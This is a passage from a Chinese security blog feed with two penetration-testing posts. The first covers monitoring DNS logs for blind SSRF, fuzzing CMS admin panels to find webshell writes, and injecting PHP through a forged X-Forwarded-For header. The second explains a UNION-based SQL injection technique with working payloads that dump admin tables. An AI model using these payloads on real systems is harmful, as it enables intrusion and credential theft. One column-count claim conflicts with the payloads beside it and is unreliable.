&lt;p&gt;以大家最常见的一个东西起-&amp;gt;扫描器，其可以辅助渗透测试工程师更好更简单的进行漏洞的信息发现，但是发现漏洞后要测试漏洞的时候哪些验证步骤是不是就很头疼呢？通过”监控”去完成是不是更好~&lt;/p&gt;

&lt;p&gt;在我们做盲测漏洞的时候可能会考虑到一些问题，最主要的问题肯定就是什么时候平台能收到结果呢？&lt;/p&gt;

&lt;p&gt;这时候就可以对接一些平台的&lt;code class=&quot;highlighter-rouge&quot;&gt;API&lt;/code&gt;进行&lt;strong&gt;关键字监控&lt;/strong&gt;了。&lt;/p&gt;

&lt;p&gt;使用&lt;code class=&quot;highlighter-rouge&quot;&gt;ceye&lt;/code&gt;的&lt;code class=&quot;highlighter-rouge&quot;&gt;API&lt;/code&gt;接口对&lt;code class=&quot;highlighter-rouge&quot;&gt;SSRF&lt;/code&gt;漏洞进行&lt;strong&gt;长期监控&lt;/strong&gt;：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;API: /api/record?token={token}&amp;amp;type={dns|request}&amp;amp;filter={filter}
token: your ceye token.
type: type of query, 'dns' or 'request'.
filter: match {filter}.{your domain}.ceye.io rule, but limit 20.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;用&lt;code class=&quot;highlighter-rouge&quot;&gt;Python&lt;/code&gt;写一个监控然后再写个发信，这样在有些环境下迟迟到来的漏洞信息就会立即被在床上玩手机的你知道了。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;其实如上的思路还可以利用很多结合dnslog的原理去监控，这里借助了ceye这个平台的API，还可以参考Bugscan的 dnslog平台 自己去搭建一个然后噼里啪啦，这里其实Burpsuite的Scanner模块就借助了这样的思路去更快捷的扫描发现SSRF漏洞，但是却没办法做到长时间的”蛰伏期”（也就是在一些情况下，结果是需要一个等待才能到达），那其实大家可以继续开拓自己的思维去想些更有价值的东西。&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;如上说的一些”姿势”可能是废话了，很多人都自己多多少少都有想过也实现了，但是别急，前菜清淡，但主菜呢，邀君共品~&lt;/p&gt;

&lt;p&gt;很多的时候，朋友就会问我xxCMS后台怎么&lt;code class=&quot;highlighter-rouge&quot;&gt;GetWebshell&lt;/code&gt;，为什么那些牛人分分钟都可以&lt;code class=&quot;highlighter-rouge&quot;&gt;Getwebshell&lt;/code&gt;了？除了看代码我怎么快速的获取&lt;code class=&quot;highlighter-rouge&quot;&gt;GetWebshell&lt;/code&gt;的”姿势”呢？&lt;/p&gt;

&lt;p&gt;一般后台&lt;code class=&quot;highlighter-rouge&quot;&gt;GetWebshell&lt;/code&gt;的”姿势”有这几种：&lt;code class=&quot;highlighter-rouge&quot;&gt;后台代码/命令执行&lt;/code&gt;、&lt;code class=&quot;highlighter-rouge&quot;&gt;代码闭合&lt;/code&gt;、&lt;code class=&quot;highlighter-rouge&quot;&gt;操作缓存&lt;/code&gt;、&lt;code class=&quot;highlighter-rouge&quot;&gt;文件上传&lt;/code&gt;等等…&lt;/p&gt;

&lt;p&gt;那其实很多的都会本文件打交道，不如先造个文件监控出来：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://vulkey.oss-cn-hangzhou.aliyuncs.com/2017-10-28/0x00.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;

&lt;p&gt;造完监控，不如来写个后台&lt;code class=&quot;highlighter-rouge&quot;&gt;GET/POST&lt;/code&gt;请求Fuzz，在做这个Fuzz的时候处理的时候遇到很多坑，脚本写的不是很好就不拿出来丢人现眼了~&lt;/p&gt;

&lt;p&gt;这里我做的Fuzz是结合&lt;code class=&quot;highlighter-rouge&quot;&gt;Burpsuite&lt;/code&gt;的&lt;code class=&quot;highlighter-rouge&quot;&gt;日志&lt;/code&gt;，进行筛选然后Fuzz：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://vulkey.oss-cn-hangzhou.aliyuncs.com/2017-10-28/0x01.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;

&lt;p&gt;这里筛选的脚本是根据 &lt;a href=&quot;https://github.com/tony1016/BurpLogFilter&quot;&gt;https://github.com/tony1016/BurpLogFilter&lt;/a&gt; 去造了一个2.7版本的~&lt;/p&gt;

&lt;p&gt;其实这个脚本大概的功能实现是这样的：&lt;/p&gt;

&lt;p&gt;设置&lt;strong&gt;GET/POST&lt;/strong&gt;传输参数对应值为随机字符串(这里使用了python的uuid)，会生成一个Fuzz&lt;code class=&quot;highlighter-rouge&quot;&gt;历史Log&lt;/code&gt;文件，以便跟文件监控对比。&lt;/p&gt;

&lt;p&gt;历史Log对比文件监控：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://vulkey.oss-cn-hangzhou.aliyuncs.com/2017-10-28/0x02.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;

&lt;p&gt;这里Fuzz之后发现有两个文件被修改了，而这两个文件因为有CMS特征的存在就不一一例举了。为什么会被修改呢？因为这里传递的值被写入了文件中，找到对应功能点发现有CSRF，一结合就造成了&lt;code class=&quot;highlighter-rouge&quot;&gt;CSRF+后台GetWebshell&lt;/code&gt;~&lt;/p&gt;

&lt;p&gt;通过如上的姿势测试了不少的CMS，又在CNVD和补天提交相对应也获得了不少的Bounty。&lt;/p&gt;

&lt;p&gt;在利用这种姿势的情况下偶然发现一个CMS前台访问的时候会生成一个缓存日志文件，而缓存日志文件的内容会记录用户的IP：&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&quot;mf&quot;&gt;127.0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;0.1&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;GET&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;center&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;useredit&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;die&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;那其getip()函数的核心代码：&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;......&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$HTTP_SERVER_VARS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;HTTP_X_FORWARDED_FOR&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]){&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$ip&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$HTTP_SERVER_VARS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;HTTP_X_FORWARDED_FOR&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;elseif&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$HTTP_SERVER_VARS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;HTTP_CLIENT_IP&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]){&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$ip&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$HTTP_SERVER_VARS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;HTTP_CLIENT_IP&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;elseif&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$HTTP_SERVER_VARS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;REMOTE_ADDR&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]){&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$ip&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$HTTP_SERVER_VARS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;REMOTE_ADDR&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;elseif&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;getenv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;HTTP_X_FORWARDED_FOR&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)){&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$ip&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;getenv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;HTTP_X_FORWARDED_FOR&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;elseif&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;getenv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;HTTP_CLIENT_IP&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)){&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$ip&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;getenv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;HTTP_CLIENT_IP&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;elseif&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;getenv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;REMOTE_ADDR&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)){&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$ip&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;getenv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;REMOTE_ADDR&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;......&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;可以通过&lt;code class=&quot;highlighter-rouge&quot;&gt;伪造XFF头&lt;/code&gt;进行PHP代码的闭合造成前台无限制GetWebshell，但是缓存文件的路径是：/www/center/temp/&lt;strong&gt;md5(text)&lt;/strong&gt;.php&lt;/p&gt;

&lt;p&gt;通过代码了解到其的文件的命名规则是&lt;code class=&quot;highlighter-rouge&quot;&gt;md5(time())&lt;/code&gt;，那其实通过记录前后的一部分时间戳加上Burpsuite的Intruder模块进行md5加密枚举就行了。&lt;/p&gt;

&lt;p&gt;那其实还可以做一些Fuzz然后实时监控Mysql的SQL执行语句：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://vulkey.oss-cn-hangzhou.aliyuncs.com/2017-10-28/0x03.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;

&lt;p&gt;首先来看下Mysql的&lt;code class=&quot;highlighter-rouge&quot;&gt;记录Log功能&lt;/code&gt;开了没有：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-mysql&quot;&gt;SHOW VARIABLES LIKE &quot;general_log%&quot;;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&quot;http://vulkey.oss-cn-hangzhou.aliyuncs.com/2017-10-28/0x04.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;

&lt;p&gt;看见其的功能OFF了~只要设置下ON就行了：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-mysql&quot;&gt;SET GLOBAL general_log = 'ON';
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&quot;http://vulkey.oss-cn-hangzhou.aliyuncs.com/2017-10-28/0x05.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;

&lt;p&gt;使用BareTail进行监控或者自己根据Log的文本规则监控就行了：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://vulkey.oss-cn-hangzhou.aliyuncs.com/2017-10-28/0x06.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;结尾&quot;&gt;结尾&lt;/h1&gt;

&lt;p&gt;本文不足之处欢迎指出，也希望大家可以GET到一点点思路，欢迎跟笔者交流。&lt;/p&gt;

&lt;p&gt;下一篇已经在草稿中了，是关于自动化Fuzz方面的内容，期待吧。&lt;/p&gt;</content><author><name>Vulkey_Chen</name></author><summary type="html">前言</summary></entry><entry><title type="html">移位溢注：告别依靠人品的偏移注入</title><link href="http://localhost:4000/archives/2017-03-08/1" rel="alternate" type="text/html" title="移位溢注：告别依靠人品的偏移注入" /><published>2017-03-08T00:00:00+08:00</published><updated>2017-03-08T00:00:00+08:00</updated><id>http://localhost:4000/archives/2017-03-08/SQLi-new</id><content type="html" xml:base="http://localhost:4000/archives/2017-03-08/1">&lt;h2 id=&quot;介绍&quot;&gt;&lt;strong&gt;介绍&lt;/strong&gt;：&lt;/h2&gt;

&lt;p&gt;在Access数据库类型注入的时候，我们获取不到列名(前提是有表名)，一般会选择使用偏移注入，但是这种注入方式往往借助的是个人的人品，且步骤繁琐。本文中我们研究了一种新的注入技术让“偏移注入不在需要人品”。在这里定义这种注入技术为：“移位溢注技术”。
它适用于ACCESS和MYSQL（任何版本）
&lt;!-- more --&gt;&lt;/p&gt;

&lt;h2 id=&quot;正文&quot;&gt;&lt;strong&gt;正文：&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;我们先来看看普通的偏移注入步骤：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.判断注入点
2.order by 判断长度
3.判断表名
4.联合查询
5.获取表中列数：**union select 1,2,3,4,..,\* from TABLE**
6.开始偏移注入：**TABLE as a inner join TABLE as b ona.id=b.id**
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;由于步骤6的方法过于需要人品值，且语句繁琐，因此在这里，我们研究新的注入技术：&lt;/p&gt;

&lt;p&gt;首先来看看步骤6语句的整体意思：&lt;/p&gt;

&lt;p&gt;步骤6的语句，&lt;strong&gt;表示给TALBE取2个别名，然后分别用别名取查询TALBE的内容（表a和表b）；而on a.id = b.id 这样的条件是为了满足语法需求，实际并没有作用，因为相同内容的表，相同字段内容一定相同。&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;这时，我们再回过头来看步骤5：&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;由于联合查询中select后面添加数字的目的是为了让联合查询返回接结果和网站正常查询返回的结果的列数一致（不一致数据库会报错，页面无法显示），且*表示通配符，可以表示整个表格所有列；因此这里通过数字来占位，并使用*来替代TABLE中的所有列，使得联合查询可以完成，并推算出*的值。&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;这时候我们继续研究偏移注入的整体公式方法，发现即使使用多级偏移注入也需要一定的概率(人品值)才可以得到想要的结果，所以我们就尝试研究新的方法能不能替换这种不固定概率的方法。&lt;/p&gt;

&lt;p&gt;现在我们重新整理一下SQL语句，从联合查询开始：&lt;/p&gt;

&lt;p&gt;1.原union语句：&lt;strong&gt;union select 1,2,3,..,p..,n from TABLE&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;（p=页面爆出的数字，可能有多个p1,p2..；n=原网站查询的总列数；TALBE=我们获得的表名；下面开始就使用上述字母的定义）&lt;/p&gt;

&lt;p&gt;2.新语句：&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;union select 1,2,3,..,p-1,TABLE.*,p+k,..,nfrom TABLE where&lt;/strong&gt; &lt;strong&gt;字段名&lt;/strong&gt; &lt;strong&gt;=&lt;/strong&gt; &lt;strong&gt;字段内容&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;–在p的位置爆出TALBE表中第一个字段的内容（其他位置还可能爆出更多内容）&lt;/p&gt;

&lt;p&gt;（这里如果存在已知字段名可以使用，没有就不用，一般id这个字段时存在的，可以使用id = 1来显示第一行）&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;union select1,2,3,..,p-2,TABLE.*,p+k-1,..,n from TABLE where&lt;/strong&gt; &lt;strong&gt;字段名&lt;/strong&gt; &lt;strong&gt;=&lt;/strong&gt; &lt;strong&gt;字段内容&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;–在p的位置爆出TALBE表中第二个字段的内容（其他位置还可能爆出更多内容）&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;union select 1,2,3,..,p-3,TABLE.*,p+k-2,..,nfrom TABLE where&lt;/strong&gt; &lt;strong&gt;字段名&lt;/strong&gt; &lt;strong&gt;=&lt;/strong&gt; &lt;strong&gt;字段内容&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;–在p的位置爆出TALBE表中第三个字段的内容（其他位置还可能爆出更多内容）&lt;/p&gt;

&lt;p&gt;注：这里一定是TALBE.&lt;em&gt;而不是&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;3.1 &lt;strong&gt;以此类推可以爆出TALBE的每一列内容。&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;3.2 &lt;strong&gt;如果p&amp;lt;k则没法爆出p+1列至k列的内容，如果n-p&amp;lt;k则无法爆出第1列至k-(n-p)列&lt;/strong&gt;。&lt;/p&gt;

&lt;h2 id=&quot;原理&quot;&gt;&lt;strong&gt;原理：&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;1.由原语句：&lt;strong&gt;union select 1,2,3,..,p..,n-k,* from TABLE&lt;/strong&gt; 可以得出该联合查询的目的是构造和原网站相同列数的查询结构，使得页面上可以显示对应的数字；这条语句相当于是做了两次查询并将它们的结果合并，第一次做了&lt;strong&gt;select 1,2,3,..,n-k from TALBE&lt;/strong&gt; ，第二次做了&lt;strong&gt;select * from TALBE&lt;/strong&gt; ，然后将它们的结果合并。&lt;/p&gt;

&lt;p&gt;这可以参考mysql的语句：&lt;strong&gt;select 1,2,3,4,5,admin.* from admin;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://vulkey.oss-cn-hangzhou.aliyuncs.com/2017-03-08/0x00.jpg&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://vulkey.oss-cn-hangzhou.aliyuncs.com/2017-03-08/0x01.jpg&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://vulkey.oss-cn-hangzhou.aliyuncs.com/2017-03-08/0x02.jpg&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;

&lt;p&gt;2.只要满足原理1的要求，保障联合查询的结果和原网站查询的结果列数一致即可；因此可以将TALBE.*向前移动至页面显示的数字处来爆出TALBE列中的内容。&lt;/p&gt;

&lt;p&gt;这可以参考mysql的语句：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-mysql&quot;&gt;select 1,2,3,4,5,6,7,8,9,10 from newswhere id =1 union select 1,2,3,4,5,6,7,admin.* from admin;
select 1,2,3,4,5,6,7,8,9,10 from newswhere id =1 union select 1,2,3,admin.*,7,8,9,10 from admin;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;注：假设数字4、5在页面显示。&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;由下图可知，其实数据已近查询出来，但是页面没有显示，这个是通过平移查询结果到页面显示的数字上去，即可爆出敏感字段。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://vulkey.oss-cn-hangzhou.aliyuncs.com/2017-03-08/0x03.jpg&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://vulkey.oss-cn-hangzhou.aliyuncs.com/2017-03-08/0x04.jpg&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;例子&quot;&gt;&lt;strong&gt;例子：&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;步骤1：&lt;/strong&gt;判断注入点是否存在&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://vulkey.oss-cn-hangzhou.aliyuncs.com/2017-03-08/0x05.jpg&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;

&lt;p&gt;步骤2：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://vulkey.oss-cn-hangzhou.aliyuncs.com/2017-03-08/0x06.jpg&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://vulkey.oss-cn-hangzhou.aliyuncs.com/2017-03-08/0x07.jpg&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;步骤3：&lt;/strong&gt;获得表名(必备条件)   and exists(select * from admin)&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://vulkey.oss-cn-hangzhou.aliyuncs.com/2017-03-08/0x08.jpg&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;步骤4：&lt;/strong&gt;获取不了列名（当尝试多个常用字段名以后，最终还是发现无法获得字段名）&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;步骤5：&lt;/strong&gt;使用联合查询(union select)&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://vulkey.oss-cn-hangzhou.aliyuncs.com/2017-03-08/0x09.jpg&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://vulkey.oss-cn-hangzhou.aliyuncs.com/2017-03-08/0x010.jpg&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;

&lt;p&gt;步骤6：使用新注入技术方法&lt;/p&gt;

&lt;p&gt;（1）获取admin表的列数：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-mysql&quot;&gt;UNION SELECT1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,*from admin #--返回错误页面

UNION SELECT1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,*from admin #--返回错误页面

UNION SELECT1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,*from admin #--返回错误页面

UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,*from admin #--返回错误页面
.....

UNION SELECT1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,*from admin #--返回步骤5页面，因此admin表的列数为6
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&quot;http://vulkey.oss-cn-hangzhou.aliyuncs.com/2017-03-08/0x011.jpg&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://vulkey.oss-cn-hangzhou.aliyuncs.com/2017-03-08/0x012.jpg&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://vulkey.oss-cn-hangzhou.aliyuncs.com/2017-03-08/0x013.jpg&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;

&lt;p&gt;（2）由于网页中包含连续数字，表示可以显示连续的查询结果，构造SQL语句查询前四列第一行。&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-mysql&quot;&gt;UNION SELECT1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,admin.*,34,35from admin
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&quot;http://vulkey.oss-cn-hangzhou.aliyuncs.com/2017-03-08/0x014.jpg&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://vulkey.oss-cn-hangzhou.aliyuncs.com/2017-03-08/0x015.jpg&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-mysql&quot;&gt;UNION SELECT1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,admin.*,34,35from admin where id = 3
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&quot;http://vulkey.oss-cn-hangzhou.aliyuncs.com/2017-03-08/0x016.jpg&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;总结&quot;&gt;&lt;strong&gt;总结&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;在这里我们命名这种新注入技术为”移位溢注”。由此如果MYSQL小于5.0的情况下所具备的条件和ACCESS一样，也可以使用此方法注入，如果是MYSQL大于5.0的版本，使用此方法可以省去获得列名的步骤。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;文章研究：&lt;/strong&gt;米斯特安全攻防实验室 MST.Lab-gh0stkey &amp;amp; Seagull&lt;/p&gt;</content><author><name>Vulkey_Chen</name></author><summary type="html">介绍：</summary></entry></feed>